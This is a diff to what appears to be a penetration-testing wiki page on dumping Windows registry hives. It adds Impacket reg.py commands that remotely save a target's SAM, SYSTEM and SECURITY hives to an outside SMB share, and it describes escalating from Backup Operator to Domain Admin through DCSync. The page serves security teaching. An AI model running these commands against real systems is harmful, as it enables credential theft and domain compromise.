@@ -36,6 +36,14 @@ reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
 reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
 ```
 
+[Impacket](https://github.com/SecureAuthCorp/impacket)'s reg.py (Python) script can also be used to do the same operation remotely for a UNIX-like machine. For instance, this can be used to easily escalate from a [Backup Operator](../../builtin-groups.md) member to a Domain Admin by dumping a Domain Controller's secrets and use them for a [DCSync](dcsync.md). _(At the time of writing, 17th Feb. 2022,_ [_the pull request_](https://github.com/SecureAuthCorp/impacket/pull/1257) _is pending)._
+
+```bash
+reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\192.168.56.1\someshare'
+reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\someshare'
+reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\someshare'
+```
+
 When Windows is not running, the hives are not mounted and they can be copied just like any other file. This can be operated when mounting the hard drive from another OS (e.g. when booting the computer on another operating system). The hive files can be found at the following locations.
 
 ```bash
